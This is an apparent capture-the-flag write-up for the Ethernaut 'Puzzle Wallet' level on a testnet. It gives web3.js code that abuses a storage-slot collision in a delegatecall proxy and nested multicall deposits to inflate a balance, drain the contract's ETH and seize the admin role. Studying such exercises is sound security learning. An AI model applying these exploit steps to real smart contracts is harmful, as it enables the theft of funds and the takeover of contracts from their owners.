# Level 24: Puzzle Wallet

## Wargame
You'll need to hijack this wallet to become the admin of the proxy.


## Key Insights
* delegatecall
* storage slot

## Attack Steps

1. Inspect the Target Contract
* Instance address:
    ```javascript
    instance = '0x6770d0B936Ad1B5531151fA5800aEF3aF4889ecC';
    ````
* Check the first two storage slots:
    ```javascript
    await web3.eth.getStorageAt(instance, 0);
    // '0x000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824'

    await web3.eth.getStorageAt(instance, 1);
    // '0x000000000000000000000000725595ba16e76ed1f6cc1e1b65a88365cc494824'
    ```
* Check the current `owner`:
    ```javascript
    await contract.owner();
    // '0x725595BA16E76ED1F6cC1e1b65A88365cC494824'
    ```


2. View the Contract Source

* You can find the contract code on Etherscan:

    [Puzzle Wallet @ Sepolia Etherscan](https://sepolia.etherscan.io/address/0x6770d0B936Ad1B5531151fA5800aEF3aF4889ecC#code)

* By decompiling the bytecode, we can confirm the target contract is **`PuzzleProxy`**:

    Decompiler: [Dedaub Decompile Tool](https://app.dedaub.com/decompile?network=ethereum)


3. Become `owner` via `proposeNewAdmin`
* The `PuzzleProxy` uses `delegatecall` to the `PuzzleWallet`, sharing the same storage layout.
`pendingAdmin` in `PuzzleProxy` overlaps with `owner` in `PuzzleWallet` (slot 0).
* Call `proposeNewAdmin` to set `pendingAdmin` to your player address:
    ```javascript
    const proposeNewAdminData = web3.eth.abi.encodeFunctionCall({
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [{ type: 'address', name: '_newAdmin' }]
    }, ['0xEB47eAB0027B0DDd5615D00f9D83eC0e71D3aeFf']);

    await web3.eth.sendTransaction({
    from: player,
    to: instance,
    data: proposeNewAdminData
    });
    ```
* Now, `owner` in `PuzzleWallet` is also set to your player address:
    ```javascript
    await contract.owner();
    // '0xEB47eAB0027B0DDd5615D00f9D83eC0e71D3aeFf'
    ```

4. Add Player to Whitelist
* With `owner` privileges, call `addToWhitelist`:
    ```javascript
    await contract.addToWhitelist(player);
    ```

5. Inflate Internal Balance via Nested `multicall`
* **Goal:** Empty the contract's ETH balance.
* We exploit a logic flaw in `multicall` to call `deposit` multiple times in one transaction.
* Prepare the `deposit` call data:
    ```javascript
    valueInWei = web3.utils.toWei('0.001', 'ether');
    const depositData = web3.eth.abi.encodeFunctionCall({
    name: 'deposit',
    type: 'function',
    inputs: []
    }, []);
    ```

* Wrap `deposit` in a single-layer `multicall`:
    ```javascript
    const multicallData1 = web3.eth.abi.encodeFunctionCall({
    name: 'multicall',
    type: 'function',
    inputs: [{ type: 'bytes[]', name: 'data' }]
    }, [[depositData]]);
    ```

* Wrap that again in another `multicall` to bypass the `depositCalled` check:
    ```javascript
    const multicallData2 = web3.eth.abi.encodeFunctionCall({
    name: 'multicall',
    type: 'function',
    inputs: [{ type: 'bytes[]', name: 'data' }]
    }, [[multicallData1, multicallData1]]);
    ```

* Call the nested multicall:
    ```javascript
    await web3.eth.sendTransaction({
    from: player,
    to: instance,
    value: valueInWei,
    data: multicallData2
    });
    ```
* **Why this works:** `depositCalled` is a local variable reset on each `multicall` call. By nesting, we can call `deposit` multiple times with only one actual ETH transfer, inflating our internal balance.

6. Drain the Contract via `execute`
    ```javascript
    balance = await getBalance(instance);
    valueInWei = web3.utils.toWei(balance, 'ether');

    await contract.execute(player, valueInWei, '0x');

    await getBalance(instance);
    // '0'
    ```

7. Set `maxBalance` to Your Address
* With the contract balance at zero, the `setMaxBalance` require condition passes.
* Since `maxBalance` in `PuzzleWallet` overlaps with `admin` in `PuzzleProxy` (slot 1), this will make you the admin.
    ```javascript
    await contract.setMaxBalance(player);

    await web3.eth.getStorageAt(instance, 1);
    // '0x000000000000000000000000eb47eab0027b0ddd5615d00f9d83ec0e71d3aeff'
    ```

## Summary

By abusing storage slot overlaps and `multicall` nesting, we:
1. Became `owner` and whitelisted ourselves.
2. Inflated our internal balance with minimal ETH deposit.
3. Drained all ETH from the contract.
4. Set ourselves as `admin` of the proxy.
